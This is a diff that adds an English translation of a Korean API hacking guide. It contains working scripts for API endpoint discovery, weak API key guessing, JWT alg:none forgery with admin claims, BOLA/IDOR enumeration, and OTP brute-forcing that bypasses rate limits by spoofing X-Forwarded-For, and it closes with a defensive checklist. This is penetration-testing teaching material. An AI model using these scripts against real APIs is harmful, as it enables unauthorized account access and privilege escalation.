@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # API 해킹 완전 가이드
 
 ## API 보안 위협 지형도
@@ -832,4 +838,228 @@ Rate Limiting:
   □ 비정상 패턴 알림
   □ API 인벤토리 관리
   □ 지원 종료 버전 제거
+```
+
+---
+
+<a name="english"></a>
+
+# Complete Guide to API Hacking
+
+## API Security Threat Landscape
+
+```
+API Security Attack Vectors:
+
+Authentication & Authorization:
+  - Broken Object Level Authorization (BOLA/IDOR)
+  - Broken Function Level Authorization
+  - Broken Authentication (JWT attacks, weak API keys)
+
+Data Exposure:
+  - Mass Assignment
+  - Excessive Data Exposure
+  - Sensitive data in responses
+
+Business Logic:
+  - Rate limit bypass
+  - Race conditions
+  - Price manipulation
+
+Infrastructure:
+  - SSRF via API endpoints
+  - XXE in XML APIs
+  - Injection (SQL, NoSQL, Command)
+```
+
+---
+
+## 1. API Discovery
+
+```bash
+# Find API endpoints
+# 1. JavaScript file analysis
+curl https://target.com | grep -oP 'api[^\s"]*'
+
+# 2. Wayback Machine historical URLs
+waybackurls target.com | grep "/api/"
+
+# 3. Swagger/OpenAPI spec discovery
+curl https://target.com/swagger.json
+curl https://target.com/api/swagger.json
+curl https://target.com/openapi.yaml
+curl https://api.target.com/v1/docs
+
+# 4. Google dorking
+site:target.com inurl:api
+site:target.com filetype:json "api"
+
+# 5. kiterunner endpoint brute force
+kr scan https://api.target.com -w ~/wordlists/routes-large.kite
+
+# 6. Postman network request
+# Use Postman Interceptor to capture and analyze all API calls
+```
+
+---
+
+## 2. Authentication Testing
+
+### API Key Testing
+
+```bash
+# Test common API key locations
+curl -H "X-API-Key: test" https://api.target.com/v1/users
+curl "https://api.target.com/v1/users?api_key=test"
+curl -H "Authorization: ApiKey test" https://api.target.com/v1/users
+
+# Check if API key is in JS source
+curl https://target.com/app.js | grep -iE "api[-_]?key|apikey"
+
+# Try common/weak API keys
+for key in "" "null" "undefined" "test" "demo" "admin"; do
+    resp=$(curl -s -o /dev/null -w "%{http_code}" \
+        -H "X-API-Key: $key" https://api.target.com/v1/users)
+    echo "$key: $resp"
+done
+```
+
+### JWT Attacks
+
+```python
+import jwt
+import base64
+import json
+
+def test_jwt_attacks(token: str) -> dict:
+    """Test common JWT vulnerabilities"""
+    
+    results = {}
+    
+    # Decode without verification
+    parts = token.split('.')
+    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
+    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+    
+    # alg:none attack
+    header_none = {**header, 'alg': 'none'}
+    h_enc = base64.urlsafe_b64encode(json.dumps(header_none).encode()).rstrip(b'=').decode()
+    p_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
+    results['alg_none_token'] = f"{h_enc}.{p_enc}."
+    
+    # Modified payload (admin privilege)
+    admin_payload = {**payload, 'role': 'admin', 'is_admin': True}
+    results['admin_payload'] = admin_payload
+    
+    return results
+```
+
+---
+
+## 3. Authorization Testing
+
+### BOLA/IDOR Testing
+
+```python
+import requests
+
+def test_bola_comprehensive(base_url: str, token: str, 
+                            endpoint: str, id_range: range) -> list:
+    """Comprehensive BOLA test"""
+    
+    findings = []
+    headers = {"Authorization": f"Bearer {token}"}
+    
+    for obj_id in id_range:
+        # Integer ID
+        resp = requests.get(f"{base_url}{endpoint}/{obj_id}", headers=headers)
+        if resp.status_code == 200:
+            findings.append({
+                "id": obj_id,
+                "type": "integer_idor",
+                "url": f"{base_url}{endpoint}/{obj_id}"
+            })
+        
+        # UUID format
+        import uuid
+        uuid_id = str(uuid.UUID(int=obj_id))
+        resp2 = requests.get(f"{base_url}{endpoint}/{uuid_id}", headers=headers)
+        if resp2.status_code == 200:
+            findings.append({
+                "id": uuid_id,
+                "type": "uuid_idor"
+            })
+    
+    return findings
+```
+
+---
+
+## 4. Rate Limit Testing
+
+```python
+import threading
+import requests
+import time
+
+def test_rate_limit(url: str, auth: str, count: int = 200, workers: int = 20) -> dict:
+    """Rate limit bypass test"""
+    
+    stats = {"success": 0, "limited": 0, "error": 0}
+    lock = threading.Lock()
+    
+    def worker():
+        headers = {
+            "Authorization": f"Bearer {auth}",
+            "X-Forwarded-For": f"10.0.{threading.get_ident() % 256}.1"
+        }
+        resp = requests.post(url, headers=headers, json={"otp": "123456"})
+        with lock:
+            if resp.status_code == 200:
+                stats["success"] += 1
+            elif resp.status_code == 429:
+                stats["limited"] += 1
+            else:
+                stats["error"] += 1
+    
+    threads = [threading.Thread(target=worker) for _ in range(count)]
+    for t in threads: t.start()
+    for t in threads: t.join()
+    
+    if stats["limited"] == 0:
+        print("[!] No rate limiting detected!")
+    elif stats["success"] > 1:
+        print(f"[!] Rate limit bypass possible: {stats['success']} successes")
+    
+    return stats
+```
+
+---
+
+## 5. API Security Defenses
+
+```
+Authentication:
+  □ Use OAuth 2.0 / OpenID Connect
+  □ JWT: short expiry (15 minutes), HS256 or RS256
+  □ API key rotation policy
+  □ Mutual TLS (mTLS) for service-to-service
+
+Authorization:
+  □ Object-level authorization check on every request
+  □ RBAC (Role-Based Access Control) implementation
+  □ Attribute-based access control for sensitive endpoints
+  □ JWT claims validation
+
+Rate Limiting:
+  □ Rate limits per endpoint
+  □ User-level and IP-level limits
+  □ Burst limit configuration
+  □ Custom limits per endpoint
+
+Monitoring:
+  □ Log all API requests
+  □ Alert on abnormal patterns
+  □ Maintain API inventory
+  □ Remove end-of-life versions
 ```
